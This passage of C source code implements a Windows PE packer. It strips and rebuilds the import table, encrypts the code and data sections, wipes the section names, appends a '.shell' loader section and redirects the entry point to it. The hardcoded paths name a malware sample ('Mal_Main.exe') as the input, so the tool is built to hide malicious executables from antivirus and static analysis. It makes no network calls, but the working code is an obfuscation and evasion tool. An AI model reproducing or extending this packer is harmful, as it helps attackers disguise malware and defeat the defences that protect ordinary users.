    for (; pIAT->u1.AddressOfData != 0; ++pIAT)
    {
      memset(pIAT, 0, sizeof(IMAGE_THUNK_DATA));
    }

    // Clear the IMAGE_IMPORT_DESCRIPTOR structure
    memset(pIDT, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
  }

  // Clear the DataDirectory of the bound import table
  if (pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress != 0x00 && pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size > 0)
  {
    memset(pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, 0, pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size);
  }

  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT], 0, sizeof(IMAGE_DATA_DIRECTORY));

  // Clear the DataDirectory of the import address table (IAT)
  if (pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress != 0x00 && pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size > 0)
  {
    memset(pPEFormat->pBaseAddr + pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress, 0, pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size);
  }

  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT], 0, sizeof(IMAGE_DATA_DIRECTORY));

  // Clear the DataDirectory of the delay import table
  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT], 0, sizeof(IMAGE_DATA_DIRECTORY));

  if (DEBUG)
  {
    printf("[+] pPEFormat->pNewImportTableBase %X\n", pPEFormat->pNewImportTableBase);
    printf("[+] pPEFormat->dwNewImportTableSize %X\n", pPEFormat->dwNewImportTableSize);
    printf("==========================================\n");
  }

  return TRUE;
}

BOOL EncryptSections(PPEFORMAT pPEFormat)
{
  DWORD dwEncryptData_Count = 0;

  static PCHAR const EncryptData_Names[] = {".text", ".data", ".rdata", "CODE", "DATA"};

  // Get the number of section data
  for (int i = 0; i < pPEFormat->pIFH->NumberOfSections; ++i)
  {
    if (pPEFormat->pISH[i].SizeOfRawData == 0x00)
    {
      continue;
    }

    for (int j = 0; j != sizeof(EncryptData_Names) / sizeof(EncryptData_Names[0]); ++j)
    {
      if (strncmp((CHAR *)pPEFormat->pISH[i].Name, EncryptData_Names[j], IMAGE_SIZEOF_SHORT_NAME) == 0)
      {
        dwEncryptData_Count += 1;
      }
    }
  }

  if (dwEncryptData_Count == 0)
  {
    printf("[!] It's not found the dwEncryptData_Count !!\n");
    return FALSE;
  }

  pPEFormat->dwEncryptDataCount = dwEncryptData_Count;

  pPEFormat->pEncryptData = (PENCRYPTDATA)VirtualAlloc(NULL, dwEncryptData_Count * sizeof(ENCRYPTDATA), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  if (pPEFormat->pEncryptData == NULL)
  {
    printf("[!] It's not found the VirtualAlloc pEncryptData !!\n");
    return FALSE;
  }
  memset(pPEFormat->pEncryptData, 0, dwEncryptData_Count * sizeof(ENCRYPTDATA));

  PENCRYPTDATA buffer = pPEFormat->pEncryptData;

  // Encrypt the section data
  for (int i = 0; i < pPEFormat->pIFH->NumberOfSections; ++i)
  {
    if (pPEFormat->pISH[i].SizeOfRawData == 0x00)
    {
      continue;
    }

    for (int j = 0; j != sizeof(EncryptData_Names) / sizeof(EncryptData_Names[0]); ++j)
    {
      if (strncmp((CHAR *)pPEFormat->pISH[i].Name, EncryptData_Names[j], IMAGE_SIZEOF_SHORT_NAME) == 0)
      {
        if (DEBUG)
        {
          printf("[+] EncryptData_Names : %s\n", EncryptData_Names[j]);
        }

        DWORD dwSectionEndSize = pPEFormat->pISH[i].SizeOfRawData;
        PBYTE pSectionData = pPEFormat->pBaseAddr + pPEFormat->pISH[i].VirtualAddress + (dwSectionEndSize - 1);

        if (dwSectionEndSize == 0)
        {
          return FALSE;
        }

        while (dwSectionEndSize > 0 && *pSectionData == 0)
        {
          --pSectionData;
          --dwSectionEndSize;
        }

        buffer->pEncryptDataBase = pPEFormat->pISH[i].VirtualAddress;
        buffer->dwEncryptDataSize = dwSectionEndSize;

        // Encrypt the section data
        EncryptFileData(pPEFormat->pBaseAddr + pPEFormat->pISH[i].VirtualAddress, dwSectionEndSize);

        ++buffer;

        pPEFormat->pISH[i].Characteristics |= IMAGE_SCN_MEM_WRITE;
      }
    }
    // Clear the section names.
    memset(pPEFormat->pISH[i].Name, 0, sizeof(pPEFormat->pISH[i].Name));
  }

  if (DEBUG)
    printf("==========================================\n");

  return TRUE;
}

BOOL AppendNewSection(PFILEVIEW pFileView, PPEFORMAT pPEFormat, LPCTSTR lpNewSectionName)
{
  IMAGE_SECTION_HEADER buffer = {0};

  // Calc the new shell section size
  DWORD dwShellSectionSize = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable) + sizeof(bShellSection_bootseg_LoadData) + sizeof(bShellSection_bootseg_Start) + sizeof(bShellSection_loadseg_Start) + sizeof(bShellSection_loadseg_LoadData) + pPEFormat->dwNewImportTableSize;

  if (pPEFormat->pIFH->NumberOfSections == 0)
  {
    printf("[!] It's not found the pPEFormat->pIFH->NumberOfSections !!\n");
    return FALSE;
  }

  // Set the section attribute
  buffer.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

  // Set the section name
  if (lpNewSectionName != NULL)
  {
    size_t lpNewSectionName_Length = strnlen(lpNewSectionName, IMAGE_SIZEOF_SHORT_NAME);
    memcpy(buffer.Name, lpNewSectionName, lpNewSectionName_Length);
  }

  // Align the section size
  DWORD dwNewSectionRawSize = ((dwShellSectionSize + pPEFormat->pIOH->FileAlignment - 1) / pPEFormat->pIOH->FileAlignment * pPEFormat->pIOH->FileAlignment);
  DWORD dwNewSectionVirtualSize = ((dwShellSectionSize + pPEFormat->pIOH->SectionAlignment - 1) / pPEFormat->pIOH->SectionAlignment * pPEFormat->pIOH->SectionAlignment);

  buffer.SizeOfRawData = dwNewSectionRawSize;
  buffer.Misc.VirtualSize = dwShellSectionSize;

  // Get the size of current headers
  DWORD dwPEHeaderRawSize = ((pFileView->dwPEHeaderSize + pPEFormat->pIOH->FileAlignment - 1) / pPEFormat->pIOH->FileAlignment * pPEFormat->pIOH->FileAlignment);
  DWORD dwPEHeaderVirtualSize = ((pFileView->dwPEHeaderSize + pPEFormat->pIOH->SectionAlignment - 1) / pPEFormat->pIOH->SectionAlignment * pPEFormat->pIOH->SectionAlignment);

  pFileView->dwNewPEHeaderSize = pFileView->dwPEHeaderSize + sizeof(IMAGE_SECTION_HEADER);

  // Calc the new size of headers after appending a section
  DWORD dwNewPEHeaderRawSize = ((pFileView->dwNewPEHeaderSize + pPEFormat->pIOH->FileAlignment - 1) / pPEFormat->pIOH->FileAlignment * pPEFormat->pIOH->FileAlignment);
  DWORD dwNewPEHeaderVirtualSize = ((pFileView->dwNewPEHeaderSize + pPEFormat->pIOH->SectionAlignment - 1) / pPEFormat->pIOH->SectionAlignment * pPEFormat->pIOH->SectionAlignment);

  // Get the offset of headers
  DWORD dwPEHeaderRawOffset = dwNewPEHeaderRawSize > dwPEHeaderRawSize ? dwNewPEHeaderRawSize - dwPEHeaderRawSize : 0;
  DWORD dwPEHeaderVirtualOffset = dwNewPEHeaderVirtualSize > dwPEHeaderVirtualSize ? dwNewPEHeaderVirtualSize - dwPEHeaderVirtualSize : 0;

  // Set the address of the section
  DWORD pSectionEndRaw = pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].PointerToRawData + pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].SizeOfRawData;

  buffer.VirtualAddress = pPEFormat->dwImageSize + dwPEHeaderVirtualOffset;
  buffer.PointerToRawData = pSectionEndRaw + dwPEHeaderRawOffset;

  // Adjust the PE_IMAGE_INFO structure / Allocate a new image
  DWORD dwNewImageSize = pPEFormat->dwImageSize + dwNewSectionVirtualSize + dwPEHeaderVirtualOffset;
  PBYTE pNewImageBase = (PBYTE)VirtualAlloc(NULL, dwNewImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  if (pNewImageBase == NULL)
  {
    printf("[!] It's not found the VirtualAlloc pNewImageBase !!\n");
    return FALSE;
  }

  // Memcpy the headers
  memcpy(pNewImageBase, pPEFormat->pBaseAddr, dwPEHeaderRawSize);

  // Memcpy the sections
  memcpy(pNewImageBase + dwPEHeaderVirtualSize + dwPEHeaderVirtualOffset, pPEFormat->pBaseAddr + dwPEHeaderVirtualSize, pPEFormat->dwImageSize - dwPEHeaderVirtualSize);

  // Set the headers of the pNewImageBase
  pPEFormat->pIDH = (PIMAGE_DOS_HEADER)pNewImageBase;
  pPEFormat->pINH = (PIMAGE_NT_HEADERS)(pNewImageBase + pPEFormat->pIDH->e_lfanew);
  pPEFormat->pIFH = &pPEFormat->pINH->FileHeader;
  pPEFormat->pIOH = &pPEFormat->pINH->OptionalHeader;
  pPEFormat->pISH = (PIMAGE_SECTION_HEADER)(pNewImageBase + pPEFormat->pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS));

  VirtualFree(pPEFormat->pBaseAddr, 0, MEM_RELEASE);

  pPEFormat->pBaseAddr = pNewImageBase;
  pPEFormat->dwImageSize = dwNewImageSize;
  pPEFormat->pIOH->CheckSum = 0;
  pPEFormat->pIOH->SizeOfImage = dwNewImageSize;
  pPEFormat->pIOH->SizeOfInitializedData += dwNewSectionRawSize;
  pPEFormat->pIOH->SizeOfHeaders = dwNewPEHeaderRawSize;

  if (dwPEHeaderRawOffset > 0 || dwPEHeaderVirtualOffset > 0)
  {
    // Adjust the address of sections
    for (WORD i = 0; i != pPEFormat->pIFH->NumberOfSections; ++i)
    {
      pPEFormat->pISH[i].PointerToRawData += dwPEHeaderRawOffset;
      pPEFormat->pISH[i].VirtualAddress += dwPEHeaderVirtualOffset;
    }
  }

  // Memcpy the new section header
  memcpy(&pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections], &buffer, sizeof(IMAGE_SECTION_HEADER));

  // Inc the NumberOfSections
  ++pPEFormat->pIFH->NumberOfSections;

  if (DEBUG)
  {
    printf("[+] lpNewSectionName : %s\n", lpNewSectionName);
    printf("[+] dwShellSectionSize : %X\n", dwShellSectionSize);
    printf("[+] pPEFormat->pIOH->FileAlignment : %X\n", pPEFormat->pIOH->FileAlignment);
    printf("[+] pPEFormat->pIOH->SectionAlignment : %X\n", pPEFormat->pIOH->SectionAlignment);
    printf("[+] dwNewSectionRawSize : %X\n", dwNewSectionRawSize);
    printf("[+] dwNewSectionVirtualSize : %X\n", dwNewSectionVirtualSize);
    printf("[+] dwPEHeaderRawOffset : %X\n", dwPEHeaderRawOffset);
    printf("[+] dwPEHeaderVirtualOffset : %X\n", dwPEHeaderVirtualOffset);
    printf("[+] dwNewImageBase : %X\n", pNewImageBase);
    printf("[+] dwNewImageSize : %X\n", dwNewImageSize);
    printf("==========================================\n");
  }

  return TRUE;
}

BOOL InstallShell(PPEFORMAT pPEFormat)
{
  // Calc the new shell section size
  DWORD dwShellSectionSize = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable) + sizeof(bShellSection_bootseg_LoadData) + sizeof(bShellSection_bootseg_Start) + sizeof(bShellSection_loadseg_Start) + sizeof(bShellSection_loadseg_LoadData) + pPEFormat->dwNewImportTableSize;

  PBYTE pShellImageBase = (PBYTE)VirtualAlloc(NULL, dwShellSectionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
  if (pShellImageBase == NULL)
  {
    printf("[!] It's not found the VirtualAlloc pShellImageBase !!\n");
    return FALSE;
  }

  // Memcpy the bShellSection_bootseg_Call
  memcpy(pShellImageBase, bShellSection_bootseg_Call, sizeof(bShellSection_bootseg_Call));

  // Memcpy the bShellSection_bootseg_ImportTable
  DWORD dwbootseg_ImportTable_Offset = sizeof(bShellSection_bootseg_Call);
  PBYTE pbootseg_ImportTable_Base = pShellImageBase + dwbootseg_ImportTable_Offset;
  memcpy(pbootseg_ImportTable_Base, bShellSection_bootseg_ImportTable, sizeof(bShellSection_bootseg_ImportTable));

  // Memcpy the bShellSection_bootseg_LoadData
  DWORD dwbootseg_LoadData_Offset = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable);
  PBYTE pbootseg_LoadData_Base = pShellImageBase + dwbootseg_LoadData_Offset;
  memcpy(pbootseg_LoadData_Base, bShellSection_bootseg_LoadData, sizeof(bShellSection_bootseg_LoadData));

  // Memcpy the bShellSection_bootseg_Start
  DWORD dwbootseg_Start_Offset = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable) + sizeof(bShellSection_bootseg_LoadData);
  PBYTE pbootseg_Start_Base = pShellImageBase + dwbootseg_Start_Offset;
  memcpy(pbootseg_Start_Base, bShellSection_bootseg_Start, sizeof(bShellSection_bootseg_Start));

  // Memcpy the bShellSection_loadseg_Start
  DWORD dwloadseg_Start_Offset = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable) + sizeof(bShellSection_bootseg_LoadData) + sizeof(bShellSection_bootseg_Start);
  PBYTE ploadseg_Start_Base = pShellImageBase + dwloadseg_Start_Offset;
  memcpy(ploadseg_Start_Base, bShellSection_loadseg_Start, sizeof(bShellSection_loadseg_Start));

  // Memcpy the bShellSection_loadseg_LoadData
  DWORD dwloadseg_LoadData_Offset = sizeof(bShellSection_bootseg_Call) + sizeof(bShellSection_bootseg_ImportTable) + sizeof(bShellSection_bootseg_LoadData) + sizeof(bShellSection_bootseg_Start) + sizeof(bShellSection_loadseg_Start);
  PBYTE ploadseg_LoadData_Base = pShellImageBase + dwloadseg_LoadData_Offset;
  memcpy(ploadseg_LoadData_Base, bShellSection_loadseg_LoadData, sizeof(bShellSection_loadseg_LoadData));

  // Memcpy the new import table
  memcpy(ploadseg_LoadData_Base + sizeof(bShellSection_loadseg_LoadData), pPEFormat->pNewImportTableBase, pPEFormat->dwNewImportTableSize);

  // Set the value of fields used by the shell
  PORGPEINFO pOrgPEInfo = (PORGPEINFO)(pShellImageBase + dwloadseg_LoadData_Offset);

  memset(pOrgPEInfo, 0, sizeof(ORGPEINFO));
  pOrgPEInfo->dwOrgEntryPoint = pPEFormat->pIOH->AddressOfEntryPoint;
  pOrgPEInfo->dwNewImportTableOffset = sizeof(bShellSection_loadseg_Start) + sizeof(bShellSection_loadseg_LoadData);
  pOrgPEInfo->dwRelocTableRva = pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
  pOrgPEInfo->pOrgImageBase = (PBYTE)pPEFormat->pIOH->ImageBase;

  if (DEBUG)
  {
    printf("[+] Org AddressOfEntryPoint : %X\n", pOrgPEInfo->dwOrgEntryPoint);
    printf("[+] Org AddressOfImageBase : %X\n", pOrgPEInfo->pOrgImageBase);
  }

  // Memcpy the thread-local storage table
  if (pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0 && pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0)
  {
    PIMAGE_TLS_DIRECTORY pTLS_Table_base = (PIMAGE_TLS_DIRECTORY)(pShellImageBase + dwbootseg_LoadData_Offset + 0x08);

    memcpy(pTLS_Table_base, &pPEFormat->ITD, sizeof(IMAGE_TLS_DIRECTORY));

    pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].VirtualAddress + dwbootseg_LoadData_Offset + 0x08;
    pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeof(IMAGE_TLS_DIRECTORY);
  }

  // Memcpy the encryption info of sections
  if (!(pPEFormat->dwEncryptDataCount <= MAX_ENCRY_SECTION_COUNT))
  {
    printf("[!] It's not found the pPEFormat->dwEncryptDataCount !!\n");
    return FALSE;
  }

  memcpy(pOrgPEInfo->OrgEncryptData, pPEFormat->pEncryptData, pPEFormat->dwEncryptDataCount * sizeof(ENCRYPTDATA));
  memset(pOrgPEInfo->OrgEncryptData + pPEFormat->dwEncryptDataCount, 0, sizeof(ENCRYPTDATA));

  // Encrypt the loadseg and the new import table
  EncryptFileData(pShellImageBase + dwloadseg_Start_Offset, (sizeof(bShellSection_loadseg_Start) + sizeof(bShellSection_loadseg_LoadData) + pPEFormat->dwNewImportTableSize));

  // Save the encryption info of the loadseg and the new import table
  PLOADSEGENCRYPTDATA ploadseg_EncryptData = (PLOADSEGENCRYPTDATA)(pShellImageBase + dwbootseg_LoadData_Offset);
  ploadseg_EncryptData->dwNewEncrytOffset = dwloadseg_Start_Offset;
  ploadseg_EncryptData->dwNewEncrytSize = sizeof(bShellSection_loadseg_Start) + sizeof(bShellSection_loadseg_LoadData) + pPEFormat->dwNewImportTableSize;

  // Adjust the import table of the shell
  DWORD imp_rva_base = pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].VirtualAddress;

  for (PIMAGE_IMPORT_DESCRIPTOR pIDT = (PIMAGE_IMPORT_DESCRIPTOR)pbootseg_ImportTable_Base; pIDT->Name != 0; ++pIDT)
  {
    if (pIDT->OriginalFirstThunk != 0)
    {
      pIDT->OriginalFirstThunk += imp_rva_base;
    }

    pIDT->Name += imp_rva_base;

    PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pShellImageBase + pIDT->FirstThunk);

    pIDT->FirstThunk += imp_rva_base;

    for (; pIAT->u1.AddressOfData != 0; ++pIAT)
    {
      pIAT->u1.AddressOfData += imp_rva_base;
    }
  }

  // Install the shell to the section
  memcpy(pPEFormat->pBaseAddr + pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].VirtualAddress, pShellImageBase, dwShellSectionSize);

  pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].SizeOfRawData = ((dwShellSectionSize + pPEFormat->pIOH->FileAlignment - 1) / pPEFormat->pIOH->FileAlignment * pPEFormat->pIOH->FileAlignment);
  pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].Misc.VirtualSize = ((dwShellSectionSize + pPEFormat->pIOH->SectionAlignment - 1) / pPEFormat->pIOH->SectionAlignment * pPEFormat->pIOH->SectionAlignment);

  // Change the entry point to the shell
  pPEFormat->pIOH->AddressOfEntryPoint = pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].VirtualAddress;
  pPEFormat->pIOH->CheckSum = 0;

  // Change the import table directory to the shell
  pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = pPEFormat->pISH[pPEFormat->pIFH->NumberOfSections - 1].VirtualAddress + dwbootseg_ImportTable_Offset;
  pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = sizeof(bShellSection_bootseg_ImportTable);

  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG], 0, sizeof(IMAGE_DATA_DIRECTORY));
  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG], 0, sizeof(IMAGE_DATA_DIRECTORY));
  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_ARCHITECTURE], 0, sizeof(IMAGE_DATA_DIRECTORY));
  memset(&pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC], 0, sizeof(IMAGE_DATA_DIRECTORY));

  if (DEBUG)
  {
    printf("[+] Chg AddressOfEntryPoint : %X\n", pPEFormat->pIOH->AddressOfEntryPoint);
    printf("[+] Chg AddressOfImportTable  : %X\n", pPEFormat->pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    printf("==========================================\n");
  }

  VirtualFree(pShellImageBase, 0, MEM_RELEASE);

  return TRUE;
}

BOOL WriteOuputFile(PFILEVIEW pFileView, PPEFORMAT pPEFormat, LPCTSTR lpOutput_Filename)
{
  HANDLE hOutputFile = INVALID_HANDLE_VALUE;
  DWORD written = 0;

  hOutputFile = CreateFile(lpOutput_Filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hOutputFile == INVALID_HANDLE_VALUE)
  {
    printf("[!] It's not found the CreateFile %s !!\n", lpOutput_Filename);
    return FALSE;
  }

  // Write the PE headers
  if (!WriteFile(hOutputFile, pPEFormat->pBaseAddr, pFileView->dwNewPEHeaderSize, &written, NULL))
  {
    printf("[!] It's not found the WriteFile PE header !!\n");
    return FALSE;
  }

  // Write the data of all sections
  for (WORD i = 0; i != pPEFormat->pIFH->NumberOfSections; ++i)
  {
    if (pPEFormat->pISH[i].SizeOfRawData == 0)
    {
      continue;
    }

    const PBYTE src = pPEFormat->pBaseAddr + pPEFormat->pISH[i].VirtualAddress;

    // sometimes the SizeOfRawData is zero, but the section still has its space in the file
    // so we must set the file pointer to the beginning of each section to write the data
    SetFilePointer(hOutputFile, pPEFormat->pISH[i].PointerToRawData, NULL, FILE_BEGIN);
    if (!WriteFile(hOutputFile, src, pPEFormat->pISH[i].SizeOfRawData, &written, NULL))
    {
      printf("[!] It's not found the WriteFile section data !! !!\n");
      return FALSE;
    }
  }

  // Write the extra data to the output file
  if (!WriteFile(hOutputFile, pPEFormat->pExtraBaseAddr, pPEFormat->dwExtraSize, &written, NULL))
  {
    printf("[!] It's not found the WriteFile extra data !!\n");
    return FALSE;
  }

  printf("[+] Output-%s\n", lpOutput_Filename);

  CloseHandle(hOutputFile);
  return TRUE;
}

void ClearHandle(PFILEVIEW pFileView, PPEFORMAT pPEFormat)
{
  // Clear memory
  UnmapViewOfFile(pFileView->pBaseAddr);
  VirtualFree(pPEFormat->pEncryptData, 0, MEM_RELEASE);
  VirtualFree(pPEFormat->pBaseAddr, 0, MEM_RELEASE);
  VirtualFree(pPEFormat->pNewImportTableBase, 0, MEM_RELEASE);
  free(pFileView);
  free(pPEFormat);
}

int main(int argc, char **argv)
{

  if (argc != 1)
  {
    Menu();
    exit(1);
  }
  else
    Main_Title();

  PFILEVIEW pFileView = {0};
  PPEFORMAT pPEFormat = {0};
  CHAR szInput_FileName[256], szlpOutput_FileName[256] = {0};

  sprintf(szInput_FileName, "C:\\Malware_Test\\Mal_Main.exe");
  sprintf(szlpOutput_FileName, "C:\\Malware_Test\\Mal_Main_Pack.exe");

  printf("[+] Get the file PE view.\n");
  if (!(pFileView = GetFileView(szInput_FileName)))
  {
    printf("[!] It's not found File-%s !!\n", szInput_FileName);
    return FALSE;
  }

  printf("[+] Mapping a new PE image.\n");
  if (!(pPEFormat = MappingPEImage(pFileView)))
  {
    printf("[!] It's not found a new PE Image!!\n");
    return FALSE;
  }

  printf("[+] New & Clear import table.\n");
  if (!NewImportTable(pPEFormat))
  {
    printf("[!] It's not found a new import table !!\n");
    return FALSE;
  }

  printf("[+] Encrypt the sections data.\n");
  if (!EncryptSections(pPEFormat))
  {
    printf("[!] It's not found the encrypt sections !!\n");
    return FALSE;
  }

  printf("[+] Append a new section.\n");
  if (!AppendNewSection(pFileView, pPEFormat, ".shell"))
  {
    printf("[!] It's not found a new seciton !!\n");
    return FALSE;
  }

  printf("[+] Install the shell data.\n");
  if (!InstallShell(pPEFormat))
  {
    printf("[!] It's not found the shell data !!\n");
    return FALSE;
  }

  printf("[+] Write the output file.\n");
  if (!WriteOuputFile(pFileView, pPEFormat, szlpOutput_FileName))
  {
    printf("[!] It's not found the ouput File !!\n");
    return FALSE;
  }

  ClearHandle(pFileView, pPEFormat);

  printf("[+] Done.\n");
  return FALSE;
}
